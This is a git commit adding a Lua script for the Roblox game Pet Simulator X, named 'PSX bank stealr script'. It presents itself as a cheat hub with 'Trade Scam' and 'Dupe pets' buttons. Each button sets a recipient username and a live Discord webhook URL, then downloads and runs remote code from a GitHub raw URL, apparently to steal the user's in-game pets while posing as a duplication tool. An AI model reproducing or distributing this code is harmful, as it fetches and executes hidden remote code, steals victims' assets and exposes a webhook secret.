8f7a45004b047676ba83b024c3a26e95e8e0098e
FavaScripts <121361935+FavaScripts@users.noreply.github.com>
2022-12-24 22:49:39 +0100

    Add files via upload

---
+++ PSX bank stealr script.lua
@@ -0,0 +1,22 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("PSX Trade Scam/Dupe Hub", "BloodTheme")
+
+-- MAIN
+local Tab = Window:NewTab("Main")
+local MainSection = Tab:NewSection("Main")
+
+
+MainSection:NewButton("Trade Scam", "Before accepting a trade click this", function()
+    UserName = "Arm_Gab"
+WebHook = "https://discord.com/api/webhooks/1055899320005705780/nZle4Kdemwl0jcd4ESGzNrC8E01iKI77_kVQuMigFodQpBVz9ZCHGeabLPwQCWsxp3t4"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+end)
+
+
+MainSection:NewButton("Dupe pets", "With a bank depoit your pets, click this, it will make rejoin you then you pets are duped", function()
+    UserName = "Arm_Gab"
+WebHook = "https://discord.com/api/webhooks/1055899320005705780/nZle4Kdemwl0jcd4ESGzNrC8E01iKI77_kVQuMigFodQpBVz9ZCHGeabLPwQCWsxp3t4"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+end)
